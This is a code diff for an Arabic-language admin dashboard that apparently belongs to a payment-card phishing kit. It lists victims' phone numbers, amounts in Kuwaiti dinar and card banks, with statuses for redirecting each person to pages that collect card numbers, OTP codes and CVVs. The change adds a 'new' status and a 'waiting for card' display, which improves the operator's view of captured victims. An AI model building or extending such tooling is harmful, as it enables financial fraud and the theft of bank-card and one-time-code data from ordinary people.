@@ -89,6 +89,7 @@
   .badge.redirect_card{background:#e8d5f5;color:#7b1fa2}
   .badge.redirect_otp{background:#e8d5f5;color:#7b1fa2}
   .badge.redirect_cvv{background:#e8d5f5;color:#7b1fa2}
+  .badge.new{background:#e3f2fd;color:#1565c0}
 
   /* action buttons in table */
   .tbl-btn{
@@ -471,6 +472,7 @@
     if (st === 'redirect_card') return '<span class="badge redirected">توجيه ← البطاقة</span>';
     if (st === 'redirect_otp') return '<span class="badge redirected">توجيه ← الكود</span>';
     if (st === 'redirect_cvv') return '<span class="badge redirected">توجيه ← CVV</span>';
+    if (st === 'new') return '<span class="badge new">جديد</span>';
     return '<span class="badge pending">قيد الانتظار</span>';
   }
 
@@ -480,13 +482,15 @@
     if(!list.length){ rows.innerHTML = '<tr><td colspan="6" class="empty">لا توجد طلبات بعد</td></tr>'; return; }
     rows.innerHTML = list.map(s => {
       const bank = detectBank(s.card);
-      const bankCell = bank
-        ? '<img src="'+escapeHtml(bank.logo)+'" alt="" style="height:22px;width:auto;vertical-align:middle;margin-left:6px" onerror="this.style.display=\'none\'"><span style="font-size:12px;font-weight:700">'+escapeHtml(bank.name)+'</span>'
-        : '<span style="color:var(--ink-soft);font-size:12px">—</span>';
+      const bankCell = s.card
+        ? (bank
+          ? '<img src="'+escapeHtml(bank.logo)+'" alt="" style="height:22px;width:auto;vertical-align:middle;margin-left:6px" onerror="this.style.display=\'none\'"><span style="font-size:12px;font-weight:700">'+escapeHtml(bank.name)+'</span>'
+          : '<span style="color:var(--ink-soft);font-size:12px">—</span>')
+        : '<span style="color:#1565c0;font-size:12px;font-weight:700">ينتظر البطاقة</span>';
       return '<tr>' +
         '<td>'+bankCell+'</td>' +
         '<td><span class="phone">'+escapeHtml(s.phone)+'</span></td>' +
-        '<td><span class="amount">'+escapeHtml(s.amount)+'</span> د.ك</td>' +
+        '<td><span class="amount">'+(parseFloat(s.amount) > 0 ? escapeHtml(s.amount)+' د.ك' : '<span style="color:var(--ink-soft)">—</span>')+'</span></td>' +
         '<td class="time">'+fmtTime(s.time)+'</td>' +
         '<td>'+statusBadge(s.status)+'</td>' +
         '<td class="td-actions">' +
